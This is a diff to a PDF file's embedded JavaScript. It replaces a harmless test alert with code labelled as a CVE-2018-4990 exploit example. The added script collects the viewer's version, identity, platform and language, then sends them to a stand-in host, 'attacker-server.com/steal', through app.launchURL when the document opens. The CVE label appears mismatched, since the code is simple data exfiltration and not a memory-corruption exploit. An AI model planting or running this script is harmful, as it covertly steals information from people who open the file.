@@ -12,9 +12,30 @@ endobj
   <</JS
   (
 try {
-  app.alert\("XSS"\)
-} catch \(e\) {
-  app.alert\(e.message\);
+  // CVE-2018-4990 Exploit Example
+  var userInfo = "";
+
+  // Collect user information
+  if (app.viewerVersion) {
+    userInfo += "Viewer Version: " + app.viewerVersion + "\n";
+  }
+  if (app.identity) {
+    userInfo += "Identity: " + app.identity + "\n";
+  }
+  if (app.platform) {
+    userInfo += "Platform: " + app.platform + "\n";
+  }
+  if (app.language) {
+    userInfo += "Language: " + app.language + "\n";
+  }
+
+  // Send data to attacker's server
+  var url = "http://attacker-server.com/steal?data=" + encodeURIComponent(userInfo);
+  var resp = app.launchURL(url, true);
+
+  app.alert("User information sent to attacker: " + resp);
+} catch (e) {
+  app.alert("Error: " + e.message);
 }
     ) 
   /S /JavaScript>>>>
